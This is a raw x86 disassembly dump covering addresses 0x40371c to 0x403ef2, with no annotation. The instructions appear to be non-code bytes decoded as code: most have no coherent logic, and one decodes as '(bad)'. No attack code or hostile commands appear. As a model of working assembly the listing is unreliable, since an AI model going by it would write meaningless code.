  40371c:	nop
  40371d:	pushf  
  40371e:	adc    BYTE PTR [eax+ebx*1+0xc05],dl
  403725:	add    DWORD PTR [edx],ecx
  403727:	or     bh,bh
  403729:	adc    eax,0x413274
  40372e:	add    ah,BYTE PTR [edx]
  403730:	add    BYTE PTR ds:0x2080d0b4,ch
  403736:	and    ah,BYTE PTR [eax]
  403738:	add    al,cl
  40373a:	add    BYTE PTR [ebx],0x2
  40373d:	sbb    BYTE PTR [ecx],0x8
  403740:	add    DWORD PTR [esp+ebp*4+0x24819410],ecx
  403747:	sub    esp,DWORD PTR ds:0x879800c2
  40374d:	jp     0x403732
  40374f:	add    BYTE PTR [esi],bh
  403751:	or     BYTE PTR [esp+eax*4+0x14a889cc],ah
  403758:	and    BYTE PTR [eax],dl
  40375a:	mov    BYTE PTR [eax],al
  40375c:	and    ah,BYTE PTR [eax+0x40031040]
  403762:	adc    eax,ecx
  403764:	xor    bl,BYTE PTR [edx]
  403766:	sahf   
  403767:	add    eax,0x20008083
  40376c:	adc    BYTE PTR [eax+eax*2-0x30],al
  403770:	lds    eax,FWORD PTR [edx-0x20]
  403773:	sub    BYTE PTR [edx],dl
  403775:	adc    bh,BYTE PTR [ebx]
  403777:	inc    edx
  403778:	and    al,BYTE PTR [eax]
  40377a:	mov    al,al
  40377c:	and    DWORD PTR [ecx+eax*1],eax
  40377f:	push   es
  403780:	add    al,0x0
  403782:	add    BYTE PTR [eax+0x15],ah
  403785:	mov    al,fs:0x80200024
  40378b:	mov    al,ds:0xcc0a03
  403790:	and    DWORD PTR [edx],0x34c14302
  403796:	test   BYTE PTR [edx],ah
  403798:	rcr    BYTE PTR [eax],0x4
  40379b:	or     BYTE PTR [eax],cl
  40379d:	add    BYTE PTR [eax],al
  40379f:	or     BYTE PTR [edx+edx*4-0x76],al
  4037a3:	rol    BYTE PTR [ecx+0x10],0x81
  4037a7:	test   BYTE PTR [esp+eax*2],al
  4037aa:	and    BYTE PTR [eax],dl
  4037ac:	add    al,BYTE PTR [ecx]
  4037ae:	sbb    al,0x1
  4037b0:	and    BYTE PTR [eax+eax*4+0x44],0xc1
  4037b5:	adc    BYTE PTR [eax+0x69],al
  4037b8:	or     BYTE PTR [ecx],cl
  4037ba:	sbb    al,0x82
  4037bc:	or     BYTE PTR [edx+0x34a42408],0x4
  4037c3:	push   eax
  4037c4:	add    eax,0xc21a414
  4037c9:	add    al,0x0
  4037cb:	add    BYTE PTR [eax],al
  4037cd:	cwde   
  4037ce:	add    BYTE PTR [ecx],0x12
  4037d1:	or     BYTE PTR [eax],0x22
  4037d4:	js     0x4037d6
  4037d6:	enter  0xa021,0x8
  4037da:	test   BYTE PTR [eax+0x2],al
  4037dd:	loopne 0x4037a2
  4037df:	and    DWORD PTR [eax],eax
  4037e1:	add    DWORD PTR [eax],esp
  4037e3:	xchg   ecx,eax
  4037e4:	lds    ecx,FWORD PTR [eax]
  4037e6:	or     BYTE PTR [edx-0x80],al
  4037e9:	mov    dl,BYTE PTR [eax]
  4037eb:	mov    al,ds:0x80230e0
  4037f0:	and    BYTE PTR [ecx-0x66ffbfe0],al
  4037f6:	nop
  4037f7:	add    eax,0x80021020
  4037fc:	pushw  ss
  4037fe:	ins    BYTE PTR es:[edi],dx
  4037ff:	or     BYTE PTR [eax+0xe40500],al
  403805:	sub    DWORD PTR [eax],ecx
  403807:	cdq    
  403808:	sub    al,0x28
  40380a:	mov    BYTE PTR [eax],ah
  40380c:	or     eax,DWORD PTR [ecx-0x7bfdfbc0]
  403812:	rol    BYTE PTR [edx+0x2252518c],0x21
  403819:	add    BYTE PTR [esi+0x44],al
  40381c:	or     BYTE PTR [eax],al
  40381e:	and    al,BYTE PTR [eax]
  403820:	or     ebx,edx
  403822:	add    al,0x0
  403824:	add    BYTE PTR [eax],cl
  403826:	mov    al,0xc4
  403828:	inc    ebp
  403829:	or     BYTE PTR [eax+0x61205c02],ch
  40382f:	sbb    BYTE PTR [ecx+ebp*1-0x4defdce8],al
  403836:	add    cl,BYTE PTR [ebx]
  403838:	adc    BYTE PTR [eax-0x6fcebd38],cl
  40383e:	add    BYTE PTR [ecx],al
  403840:	add    BYTE PTR [eax+0x14011103],al
  403846:	add    BYTE PTR [ecx],al
  403848:	ret    0x8000
  40384b:	adc    ecx,DWORD PTR [eax]
  40384d:	push   ss
  40384e:	sbb    BYTE PTR [eax],ah
  403850:	inc    eax
  403851:	jns    0x403876
  403853:	sub    BYTE PTR [ebp-0x3f6ab400],al
  403859:	loop   0x40389b
  40385b:	nop
  40385c:	and    al,0x0
  40385e:	push   ebp
  40385f:	add    eax,0xe00810
  403864:	add    al,0x22
  403866:	xchg   DWORD PTR [eax],eax
  403868:	add    BYTE PTR [eax-0x7ffafffc],al
  40386e:	add    BYTE PTR [edx],al
  403870:	sbb    cl,BYTE PTR [ecx+edx*4]
  403873:	or     BYTE PTR [eax-0x77],cl
  403876:	add    BYTE PTR [eax],0x92
  403879:	and    BYTE PTR [ecx+eax*1],bl
  40387c:	sub    BYTE PTR [edx+0xc],al
  40387f:	adc    ah,BYTE PTR [ecx]
  403881:	mov    al,ds:0x50c1091b
  403886:	add    BYTE PTR [eax],al
  403888:	sub    al,0x4
  40388a:	loope  0x40388d
  40388c:	test   BYTE PTR [eax+0x6a],bh
  40388f:	enter  0x8a0,0x8
  403893:	and    BYTE PTR [eax+ebp*2],cl
  403896:	or     eax,0x19002005
  40389b:	bound  eax,QWORD PTR [eax+0x66]
  40389e:	popf   
  40389f:	push   eax
  4038a0:	push   es
  4038a1:	call   0x5503:0x10000491
  4038a8:	dec    eax
  4038a9:	add    ah,BYTE PTR [eax+0x36480000]
  4038af:	nop
  4038b0:	test   BYTE PTR [edx],al
  4038b2:	add    DWORD PTR ds:0x8484a0aa,esp
  4038b8:	mov    al,ds:0x56040a0d
  4038bd:	les    eax,FWORD PTR [ecx]
  4038bf:	adc    eax,DWORD PTR [eax+0xa]
  4038c2:	add    BYTE PTR [ecx+0x20480c9],al
  4038c8:	xchg   ebp,eax
  4038c9:	add    al,0xa1
  4038cb:	inc    esi
  4038cc:	test   BYTE PTR [esi],al
  4038ce:	push   esp
  4038cf:	pop    ss
  4038d0:	and    al,al
  4038d2:	add    BYTE PTR [edx],cl
  4038d4:	and    BYTE PTR [eax+0x20204505],cl
  4038da:	test   al,0x12
  4038dc:	xor    BYTE PTR [eax],al
  4038de:	adc    BYTE PTR [ecx],al
  4038e0:	mov    BYTE PTR [eax],ah
  4038e2:	or     BYTE PTR [ebx+0x51],0x62
  4038e6:	dec    eax
  4038e7:	xor    cl,BYTE PTR [ecx]
  4038e9:	push   eax
  4038ea:	sub    edi,DWORD PTR [ebp+0xe]
  4038ed:	(bad)  
  4038ee:	rol    BYTE PTR [esi],0xc0
  4038f1:	test   BYTE PTR [edi+0x31],ah
  4038f4:	shl    DWORD PTR [eax-0x42],0x8
  4038f8:	and    BYTE PTR [eax+0xd00061a],al
  4038fe:	adc    BYTE PTR [ecx],al
  403900:	add    DWORD PTR [eax+0x0],eax
  403903:	xchg   BYTE PTR [ecx],dl
  403905:	pusha  
  403906:	or     eax,0x10613011
  40390b:	add    BYTE PTR [ecx+0x9],al
  40390e:	add    DWORD PTR [eax+0x78290908],eax
  403914:	mov    eax,ds:0x1577c4
  403919:	add    dh,BYTE PTR [edx+0x41]
  40391c:	pop    ss
  40391d:	or     esp,eax
  40391f:	add    al,0x1c
  403921:	mov    eax,ds:0x2200040a
  403926:	lea    esp,[edx]
  403928:	or     BYTE PTR [eax+0x14],al
  40392b:	and    eax,0x38206cac
  403930:	push   0x22a22270
  403935:	mov    al,BYTE PTR [eax+0xa302002]
  40393b:	inc    esp
  40393c:	cmp    BYTE PTR [ecx],dl
  40393e:	mov    al,ds:0x9881c193
  403943:	inc    eax
  403944:	add    al,BYTE PTR [edx-0x7f]
  403947:	or     bl,al
  403949:	mov    esp,gs
  40394b:	inc    esi
  40394c:	mov    WORD PTR [eax+0x13],fs
  40394f:	add    BYTE PTR [eax-0x3c],al
  403952:	or     eax,DWORD PTR [esp+eax*4+0xe000a0]
  403959:	add    al,0xc5
  40395b:	dec    eax
  40395c:	add    BYTE PTR [edx],cl
  40395e:	add    DWORD PTR [eax+0x1a917a],ecx
  403964:	add    BYTE PTR [edx],cl
  403966:	sub    al,BYTE PTR [ebp+0x207002c0]
  40396c:	mov    BYTE PTR [eax],ah
  40396e:	rol    BYTE PTR [esi],cl
  403970:	sub    BYTE PTR [ecx+0x1c2c124c],al
  403976:	add    ah,BYTE PTR [edx+0x0]
  403979:	add    DWORD PTR [eax],ebp
  40397b:	and    BYTE PTR [ecx+0x824c1],ah
  403981:	add    DWORD PTR ds:0x1ae0a04a,eax
  403987:	adc    BYTE PTR [ecx],ah
  403989:	add    BYTE PTR [eax+eiz*8+0x74],0x50
  40398e:	add    DWORD PTR [ecx],eax
  403990:	sbb    BYTE PTR [eax+0x60828218],0x64
  403997:	dec    ecx
  403998:	int3   
  403999:	test   BYTE PTR [eax-0x4a5bf36f],al
  40399f:	adc    BYTE PTR [edx+0x40],al
  4039a2:	add    cl,BYTE PTR [eax]
  4039a4:	push   ecx
  4039a5:	add    eax,0x4a940406
  4039aa:	add    al,al
  4039ac:	add    BYTE PTR [edx+0x45a20060],al
  4039b2:	jno    0x40399c
  4039b4:	or     al,0x24
  4039b6:	adc    BYTE PTR [esi],0x0
  4039b9:	and    eax,DWORD PTR [esi]
  4039bb:	or     BYTE PTR [eax],0x81
  4039be:	mov    BYTE PTR [eax-0x4b],0x22
  4039c2:	add    BYTE PTR [eax],al
  4039c4:	mov    DWORD PTR [edx],0x1201014c
  4039ca:	inc    edx
  4039cb:	and    DWORD PTR [eax],ecx
  4039cd:	add    al,BYTE PTR [eax]
  4039cf:	inc    esp
  4039d0:	test   BYTE PTR [esi+0xb],al
  4039d3:	sub    ch,BYTE PTR [edx+eax*2]
  4039d6:	add    BYTE PTR [edx],dl
  4039d8:	test   BYTE PTR [eax-0x747f8000],cl
  4039de:	add    eax,0x8098103
  4039e3:	pop    edx
  4039e4:	and    BYTE PTR [eax],dl
  4039e6:	xchg   esi,eax
  4039e7:	mov    BYTE PTR [eax+0x0],cl
  4039ea:	push   eax
  4039eb:	inc    ecx
  4039ec:	or     BYTE PTR [eax-0x78],al
  4039ef:	dec    eax
  4039f0:	adc    DWORD PTR [eax],ebx
  4039f2:	inc    eax
  4039f3:	or     al,0x8
  4039f5:	add    al,BYTE PTR [eax]
  4039f7:	add    DWORD PTR [eax],esp
  4039f9:	bound  eax,QWORD PTR [esi]
  4039fb:	mov    eax,ds:0x360fa00
  403a00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a01:	add    ecx,DWORD PTR [eax]
  403a03:	bound  eax,QWORD PTR [ecx+0x5]
  403a06:	add    DWORD PTR [edx-0x80],0x9093140a
  403a0d:	add    cl,0x80
  403a10:	or     DWORD PTR [ecx],esp
  403a12:	and    BYTE PTR [edx+0x2],al
  403a15:	add    BYTE PTR [eax+0x44],al
  403a18:	loop   0x403a1c
  403a1a:	loope  0x403a1c
  403a1c:	inc    eax
  403a1d:	or     DWORD PTR [edx+0x24020dc0],ecx
  403a23:	add    BYTE PTR [esi+0x20020103],ah
  403a29:	sbb    al,BYTE PTR [eax]
  403a2b:	xor    BYTE PTR [eax],cl
  403a2d:	rcl    BYTE PTR [esi],1
  403a2f:	push   eax
  403a30:	add    BYTE PTR [eax+0x2044050],al
  403a36:	and    DWORD PTR [eax+eax*2],ebx
  403a39:	or     BYTE PTR [eax],al
  403a3b:	add    BYTE PTR [ecx],al
  403a3d:	add    DWORD PTR [eax],eax
  403a3f:	add    BYTE PTR [ecx],al
  403a41:	mov    al,ds:0x811022a1
  403a46:	and    BYTE PTR ds:0x40064082,al
  403a4c:	sub    BYTE PTR [edx+0x8],al
  403a4f:	sub    BYTE PTR [eax],al
  403a51:	or     DWORD PTR [ecx-0x6d],0x9d050
  403a58:	add    BYTE PTR [ecx-0x3f],dl
  403a5b:	add    al,0x2a
  403a5d:	xor    ch,al
  403a5f:	dec    eax
  403a60:	add    al,BYTE PTR [eax+0x10858805]
  403a66:	add    al,0x5
  403a68:	inc    ecx
  403a69:	inc    eax
  403a6a:	and    al,0x2
  403a6c:	add    DWORD PTR [eax+eax*4+0x4061a2cc],eax
  403a73:	add    al,0xe
  403a75:	xchg   edx,eax
  403a76:	and    bl,BYTE PTR [ecx]
  403a78:	inc    eax
  403a79:	test   al,0x0
  403a7b:	inc    eax
  403a7c:	add    BYTE PTR [eax],al
  403a7e:	add    BYTE PTR [ebx+0x8400202],bl
  403a84:	adc    dl,BYTE PTR [esp+eax*1+0x30]
  403a88:	add    al,BYTE PTR [eax]
  403a8a:	add    BYTE PTR [eax],dl
  403a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a8d:	or     BYTE PTR [eax],ah
  403a8f:	push   eax
  403a90:	rol    BYTE PTR [eax+0x29a20601],0x82
  403a97:	add    BYTE PTR [eax],bl
  403a99:	dec    eax
  403a9a:	add    al,BYTE PTR [ebx-0x7bfcbfd4]
  403aa0:	push   cs
  403aa1:	push   0x20580800
  403aa6:	inc    eax
  403aa7:	push   ecx
  403aa8:	xor    BYTE PTR [edx+0x20],ah
  403aab:	and    DWORD PTR [eax],edx
  403aad:	adc    BYTE PTR [ecx],dl
  403aaf:	mov    bl,0x10
  403ab1:	sub    BYTE PTR [edx],al
  403ab3:	mov    BYTE PTR [edx],dl
  403ab5:	and    cl,0x53
  403ab8:	xor    BYTE PTR [eax+eax*1],dh
  403abb:	inc    edx
  403abc:	and    al,BYTE PTR [ecx+0x49]
  403abf:	adc    BYTE PTR [eax],0x20
  403ac2:	mov    BYTE PTR [ecx+0x2],ch
  403ac5:	add    al,0xa0
  403ac7:	or     eax,DWORD PTR [esi]
  403ac9:	add    BYTE PTR [eax+0x2924a000],bl
  403acf:	sub    cl,BYTE PTR [ebx]
  403ad1:	sub    BYTE PTR [eax+0x0],cl
  403ad4:	int    0x0
  403ad6:	add    eax,0x28a040
  403adb:	rcr    BYTE PTR [eax+0x90ba12e],0x22
  403ae2:	lds    ecx,FWORD PTR [ecx+0x510a6030]
  403ae8:	add    BYTE PTR [ebx-0x3b6ed6fe],0x40
  403aef:	adc    BYTE PTR [ebp+eax*1-0x66e2f56e],ch
  403af6:	push   ecx
  403af7:	adc    ah,dh
  403af9:	or     BYTE PTR [esp+ecx*2],al
  403afc:	or     BYTE PTR [eax+0x28],dl
  403aff:	sbb    DWORD PTR [esi+0x5a08201],edx
  403b05:	add    DWORD PTR [eax+eax*1],ebp
  403b08:	push   es
  403b09:	sub    BYTE PTR [eax+0x4194102],dl
  403b0f:	inc    edx
  403b10:	or     BYTE PTR [ecx+eax*1],0x9
  403b14:	adc    DWORD PTR [eax+0x20220100],ecx
  403b1a:	ret    0x8400
  403b1d:	add    DWORD PTR [eax+0x2220c80],eax
  403b23:	inc    eax
  403b24:	lahf   
  403b25:	add    ah,BYTE PTR [eax]
  403b27:	lahf   
  403b28:	adc    al,BYTE PTR [eax-0x5c]
  403b2b:	push   ecx
  403b2c:	dec    edx
  403b2d:	inc    eax
  403b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b2f:	or     al,cl
  403b31:	add    al,0x50
  403b33:	xor    al,BYTE PTR [ecx-0x75ffdeff]
  403b39:	inc    eax
  403b3a:	lock mov BYTE PTR [eax+eax*1+0x12],al
  403b3f:	push   ss
  403b40:	in     al,dx
  403b41:	mov    al,ds:0x503491a0
  403b46:	adc    eax,DWORD PTR [edx]
  403b48:	add    BYTE PTR [edx+eax*4-0x75],al
  403b4c:	fs or  al,0x8
  403b4f:	sub    BYTE PTR [eax+0x20],bl
  403b52:	shl    DWORD PTR [ecx],0x0
  403b55:	push   eax
  403b56:	dec    ebp
  403b57:	adc    BYTE PTR [eax+0x20],al
  403b5a:	add    BYTE PTR [eax-0x73fffffc],al
  403b60:	je     0x403aea
  403b62:	pusha  
  403b63:	imul   eax,DWORD PTR [eax],0x83384172
  403b69:	add    BYTE PTR [ebx],ah
  403b6b:	xchg   edx,eax
  403b6c:	push   ecx
  403b6d:	push   es
  403b6e:	dec    esp
  403b6f:	and    cl,BYTE PTR [ebx]
  403b71:	js     0x403bb4
  403b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b74:	sbb    DWORD PTR [eax+0x214],0x38020100
  403b7e:	dec    eax
  403b7f:	add    DWORD PTR [esi+0x18],eax
  403b82:	pusha  
  403b83:	add    al,al
  403b85:	mov    ds:0x9300201,eax
  403b8a:	xchg   edx,eax
  403b8b:	add    ebp,DWORD PTR [ecx+0x4b600d8]
  403b91:	add    BYTE PTR [eax],dl
  403b93:	xchg   BYTE PTR ds:0x410497,al
  403b99:	add    BYTE PTR [eax],al
  403b9b:	shl    DWORD PTR [eax-0x6c],0x62
  403b9f:	add    BYTE PTR [ecx],al
  403ba1:	jmp    0x7599bfa6
  403ba6:	add    BYTE PTR [ecx+0x3ce000c],ah
  403bac:	add    BYTE PTR [ecx],dl
  403bae:	add    BYTE PTR [esi],cl
  403bb0:	push   ds
  403bb1:	sub    ecx,DWORD PTR [eax]
  403bb3:	nop
  403bb4:	sub    DWORD PTR [eax],edx
  403bb6:	add    BYTE PTR [eax+eax*1+0x0],dh
  403bba:	loopne 0x403bdc
  403bbc:	add    DWORD PTR [eax+eax*1+0x2],edx
  403bc0:	xchg   ecx,eax
  403bc1:	or     BYTE PTR [eax+0x28],cl
  403bc4:	add    BYTE PTR [edx],0x90
  403bc7:	add    BYTE PTR [eax],ah
  403bc9:	or     al,0x0
  403bcb:	or     BYTE PTR [ebx+0x62],al
  403bce:	test   ch,al
  403bd0:	add    al,BYTE PTR [ebp-0x6f]
  403bd3:	xchg   edx,eax
  403bd4:	push   ds
  403bd5:	add    BYTE PTR [ecx+eax*1],al
  403bd8:	test   DWORD PTR [eax-0x3ef61fc0],ecx
  403bde:	mov    BYTE PTR [eax],al
  403be0:	or     DWORD PTR [ebx+0x48],ecx
  403be3:	and    BYTE PTR [eax],ah
  403be5:	add    BYTE PTR [ecx],0x18
  403be8:	or     DWORD PTR [eax+0x10],0xffffff84
  403bec:	adc    al,BYTE PTR [esp+eax*1]
  403bef:	and    BYTE PTR [eax],dl
  403bf1:	mov    BYTE PTR [edx+0x514c64c0],dl
  403bf7:	es push ss
  403bf9:	ror    DWORD PTR [eax+0x20],0x0
  403bfd:	adc    BYTE PTR [eax],al
  403bff:	sbb    BYTE PTR [eax+0x1600800],al
  403c05:	or     al,0x84
  403c07:	push   esp
  403c08:	add    BYTE PTR [ebx],al
  403c0a:	xchg   BYTE PTR [eax],dl
  403c0c:	add    BYTE PTR [eax],al
  403c0e:	push   eax
  403c0f:	add    ecx,DWORD PTR [eax+eiz*1-0x10]
  403c13:	fcom   DWORD PTR [ebx]
  403c15:	and    DWORD PTR [eax+eax*2-0x66],eax
  403c19:	sub    BYTE PTR [edx+0x42110821],bl
  403c1f:	add    BYTE PTR [eax+0xa],ch
  403c22:	push   es
  403c23:	add    DWORD PTR [eax],0x20030b80
  403c29:	mov    eax,0x20140a24
  403c2e:	or     al,BYTE PTR [eax-0x4ffff47a]
  403c34:	inc    eax
  403c35:	add    BYTE PTR [edx],ah
  403c37:	in     al,0x82
  403c39:	or     BYTE PTR [edx-0x80],al
  403c3c:	and    DWORD PTR [eax+0x14805081],esp
  403c42:	add    esp,eax
  403c44:	inc    edx
  403c45:	mov    DWORD PTR [eax],edx
  403c47:	add    eax,0x180991
  403c4c:	inc    ecx
  403c4d:	add    eax,0x8900c20c
  403c52:	push   edx
  403c53:	and    BYTE PTR [ecx-0x7b77cddf],al
  403c59:	sub    BYTE PTR [esi-0x6e],al
  403c5c:	add    eax,0x42080860
  403c61:	add    al,0x1c
  403c63:	add    ah,BYTE PTR [eax]
  403c65:	add    BYTE PTR [ecx],ah
  403c67:	pop    edi
  403c68:	and    BYTE PTR [ecx],bl
  403c6a:	pop    eax
  403c6b:	shr    BYTE PTR [ecx+0x31],1
  403c6e:	and    al,0x3
  403c70:	add    al,BYTE PTR [ecx+0xb04482a]
  403c76:	inc    eax
  403c77:	xchg   edi,eax
  403c78:	or     BYTE PTR [eax],al
  403c7a:	xor    BYTE PTR [eax+0x51038],ah
  403c80:	or     al,0x0
  403c82:	adc    eax,DWORD PTR [eax+0x110200d0]
  403c88:	add    esp,DWORD PTR [edx+eiz*4-0x4ae79fc0]
  403c8f:	data16 add al,BYTE PTR [eax]
  403c92:	test   BYTE PTR [ecx],cl
  403c94:	rol    BYTE PTR [eax-0x3dee7ffc],0x3e
  403c9b:	or     DWORD PTR [ecx],ecx
  403c9d:	adc    BYTE PTR [edx],0x82
  403ca0:	adc    edx,edx
  403ca2:	rol    BYTE PTR [eax-0x6b5bfedf],0xce
  403ca9:	and    BYTE PTR [eax-0x7fdbcfa0],cl
  403caf:	add    BYTE PTR [edx+edx*1],al
  403cb2:	and    BYTE PTR [eax-0x7fdb7d62],al
  403cb8:	dec    eax
  403cb9:	dec    ecx
  403cba:	mov    esp,0x642011c1
  403cbf:	add    BYTE PTR [eax],0x40
  403cc2:	and    BYTE PTR [ecx],0x26
  403cc5:	xchg   DWORD PTR [ecx],eax
  403cc7:	dec    ecx
  403cc8:	push   ds
  403cc9:	inc    eax
  403cca:	adc    ch,BYTE PTR [eax]
  403ccc:	pusha  
  403ccd:	enter  0x2680,0x40
  403cd1:	shl    BYTE PTR [edi+0xa],0x0
  403cd5:	push   ss
  403cd6:	enter  0x240,0x16
  403cda:	adc    BYTE PTR [eax-0x3c],dl
  403cdd:	mov    al,ds:0x20400004
  403ce2:	rcl    BYTE PTR [eax+0x18],0x4
  403ce6:	add    BYTE PTR [ecx+0x101c0009],ah
  403cec:	mov    fs,WORD PTR [eax]
  403cee:	push   eax
  403cef:	and    ah,BYTE PTR [eax+0x10408098]
  403cf5:	add    cl,dh
  403cf7:	add    eax,0x14806522
  403cfc:	add    al,0xc1
  403cfe:	test   BYTE PTR [eax],ah
  403d00:	call   0x10d0fd46
  403d05:	inc    eax
  403d06:	or     DWORD PTR [esi-0x627faf40],eax
  403d0c:	dec    eax
  403d0d:	loopne 0x403d30
  403d0f:	or     BYTE PTR [ecx],ah
  403d11:	push   ecx
  403d12:	add    BYTE PTR [eax],dl
  403d14:	test   ah,al
  403d16:	adc    BYTE PTR [esp+eax*1],0xa0
  403d1a:	xor    al,0xc0
  403d1c:	mov    dl,0x48
  403d1e:	test   DWORD PTR [eax],eax
  403d20:	and    al,BYTE PTR [eax]
  403d22:	xchg   ecx,eax
  403d23:	add    BYTE PTR [eax],0x88
  403d26:	add    BYTE PTR [eax+0x12310],al
  403d2c:	pusha  
  403d2d:	or     DWORD PTR ds:0xc4311418,esi
  403d33:	rol    DWORD PTR [ebp+0x13704ed],0x10
  403d3a:	push   es
  403d3b:	sbb    DWORD PTR [eax],esi
  403d3d:	add    BYTE PTR [esp+ebx*1],cl
  403d40:	add    ah,dh
  403d42:	adc    al,0x20
  403d44:	test   BYTE PTR [eax],al
  403d46:	or     BYTE PTR [eax],0x0
  403d49:	pop    edi
  403d4a:	and    ch,dh
  403d4c:	test   al,dl
  403d4e:	ret    0x8c80
  403d51:	mov    BYTE PTR [edx+0x240c3495],al
  403d57:	add    ah,BYTE PTR [eax]
  403d59:	add    BYTE PTR [ecx+0x200592],al
  403d5f:	dec    edx
  403d60:	test   DWORD PTR [ecx+0x6],ecx
  403d63:	adc    al,BYTE PTR [eax]
  403d65:	add    BYTE PTR [edx],dl
  403d67:	xchg   esp,eax
  403d68:	add    BYTE PTR [eax+0x0],ah
  403d6b:	mov    eax,ds:0x41a004c8
  403d70:	add    DWORD PTR [eax],0xffffff90
  403d73:	add    BYTE PTR [ecx-0x78],dh
  403d76:	add    al,0x4
  403d78:	add    BYTE PTR [eax+0x2],0x20
  403d7c:	xchg   ecx,eax
  403d7d:	add    DWORD PTR [edx],0x830c1401
  403d83:	pop    eax
  403d84:	inc    ecx
  403d85:	add    DWORD PTR [ecx+0x4],ecx
  403d88:	inc    esp
  403d89:	pusha  
  403d8a:	and    BYTE PTR [eax+0x2807a004],al
  403d90:	or     al,0x86
  403d92:	or     al,0x81
  403d94:	add    BYTE PTR [esi],al
  403d96:	mov    ds:0x844,al
  403d9b:	xchg   ecx,eax
  403d9c:	dec    ebx
  403d9d:	add    BYTE PTR [ebp+0x6],al
  403da0:	adc    eax,0x30000820
  403da5:	and    BYTE PTR [esi],al
  403da7:	add    DWORD PTR [edx],eax
  403da9:	inc    eax
  403daa:	inc    edx
  403dab:	or     al,0x1
  403dad:	and    al,0x80
  403db0:	sub    BYTE PTR [eax+0x31],cl
  403db3:	adc    al,0x80
  403db5:	mov    dh,0x5
  403db7:	nop
  403db8:	adc    cl,cl
  403dba:	add    DWORD PTR [eax],eax
  403dbc:	mov    cl,0x85
  403dbe:	add    ebp,edx
  403dc0:	add    DWORD PTR [esi+edx*4],eax
  403dc3:	mov    DWORD PTR ds:0x1a008108,esp
  403dc9:	push   eax
  403dca:	inc    ebx
  403dcb:	push   ss
  403dcc:	inc    edx
  403dcd:	inc    ecx
  403dce:	add    ebp,DWORD PTR [eax]
  403dd0:	or     al,0x91
  403dd2:	sub    al,0x34
  403dd4:	popf   
  403dd5:	cwde   
  403dd6:	sbb    BYTE PTR [eax],dh
  403dd8:	add    BYTE PTR [eax-0x7fb9f3c0],0x6
  403ddf:	add    BYTE PTR [esi+eiz*1+0x32],al
  403de3:	add    BYTE PTR [ebx],0x11
  403de6:	mov    WORD PTR [ecx],es
  403de8:	sbb    BYTE PTR [eax+0x43080000],al
  403dee:	sbb    BYTE PTR [edx],cl
  403df0:	xor    BYTE PTR [ecx],0xc8
  403df3:	add    DWORD PTR [edi],eax
  403df5:	inc    eax
  403df6:	rol    DWORD PTR [eax+0xa],0x2f
  403dfa:	and    BYTE PTR [eax],0x18
  403dfd:	and    bl,BYTE PTR [ebx+0x2]
  403e00:	sbb    al,BYTE PTR [eax]
  403e02:	test   BYTE PTR [eax],al
  403e04:	or     BYTE PTR [ecx-0x76],al
  403e07:	sub    eax,0x40029
  403e0c:	rcr    BYTE PTR fs:[edx],0x84
  403e10:	mov    DWORD PTR [ecx+edi*1+0x42],edx
  403e14:	add    BYTE PTR [ebp+0x0],al
  403e17:	push   ebx
  403e18:	add    dh,BYTE PTR [eax+0x44881814]
  403e1e:	add    DWORD PTR [eax],eax
  403e20:	xor    BYTE PTR [ecx],al
  403e22:	pusha  
  403e23:	adc    BYTE PTR [eax],ah
  403e25:	push   ss
  403e26:	inc    ecx
  403e27:	or     BYTE PTR [ecx+0xcba1c8],dl
  403e2d:	add    eax,0x24299181
  403e32:	add    BYTE PTR [ecx],cl
  403e34:	push   es
  403e35:	xchg   esp,eax
  403e36:	inc    edx
  403e37:	add    al,0x1
  403e39:	pop    eax
  403e3a:	add    dl,BYTE PTR [edx+0x8]
  403e3d:	or     al,0x0
  403e3f:	or     BYTE PTR [eax],al
  403e41:	add    DWORD PTR [eax+0x1],ebp
  403e44:	sbb    eax,0x1854d08
  403e49:	add    eax,0x10222096
  403e4e:	nop
  403e4f:	xor    BYTE PTR [eax],dl
  403e51:	adc    BYTE PTR [eax],ch
  403e53:	mov    al,ds:0x58490
  403e58:	pusha  
  403e59:	inc    eax
  403e5a:	inc    eax
  403e5b:	rol    BYTE PTR [ecx+0x9],1
  403e5e:	and    BYTE PTR [eax-0x7f757fe4],0x0
  403e65:	dec    edx
  403e66:	push   eax
  403e67:	es jns 0x403e0a
  403e6a:	add    BYTE PTR [ebx],dl
  403e6c:	add    BYTE PTR [ecx],dh
  403e6e:	add    al,0x74
  403e70:	xchg   BYTE PTR [ecx],cl
  403e72:	push   ecx
  403e73:	and    al,0x2
  403e75:	sbb    ah,BYTE PTR [eax+0x3020818]
  403e7b:	add    BYTE PTR [esp+eax*1+0x2],cl
  403e7f:	add    ah,ah
  403e81:	xor    BYTE PTR [eax],bl
  403e83:	add    BYTE PTR [ecx+0x2a124c01],cl
  403e89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e8a:	test   BYTE PTR [eax+0x2],al
  403e8d:	gs gs push eax
  403e90:	adc    BYTE PTR [eax],dl
  403e92:	and    ah,BYTE PTR [eax]
  403e94:	nop
  403e95:	lea    eax,[edx+0x1088a302]
  403e9b:	add    BYTE PTR [eax+eax*4+0x1400922],ah
  403ea2:	and    al,0x0
  403ea4:	adc    DWORD PTR [eax-0x60],0x102800
  403eab:	add    eax,0x1202c200
  403eb0:	xchg   BYTE PTR [edx],al
  403eb2:	rol    BYTE PTR [eax],cl
  403eb4:	pusha  
  403eb5:	or     DWORD PTR [eax],esp
  403eb7:	or     BYTE PTR [esi+0x49],dh
  403eba:	mov    al,0x8
  403ebc:	or     BYTE PTR [ebx+eiz*1],al
  403ebf:	inc    ebp
  403ec0:	dec    ebp
  403ec1:	inc    ebx
  403ec2:	or     al,0x4
  403ec4:	add    BYTE PTR [ecx+0x0],ah
  403ec7:	and    edx,DWORD PTR [eax]
  403ec9:	pop    es
  403eca:	and    BYTE PTR [ecx+0x440],cl
  403ed0:	add    bh,BYTE PTR [edi]
  403ed2:	inc    eax
  403ed3:	and    dl,BYTE PTR [eax+0x1600190c]
  403ed9:	adc    BYTE PTR [eax+eax*1],al
  403edc:	adc    BYTE PTR [ecx],al
  403ede:	dec    edx
  403edf:	inc    ebp
  403ee0:	adc    al,0x84
  403ee2:	add    BYTE PTR [eax],cl
  403ee4:	cmp    DWORD PTR [ecx],ecx
  403ee6:	or     DWORD PTR [ebx],0x22c14015
  403eec:	add    BYTE PTR [edx+0x510020c3],al
  403ef2:	jp     0x403f04
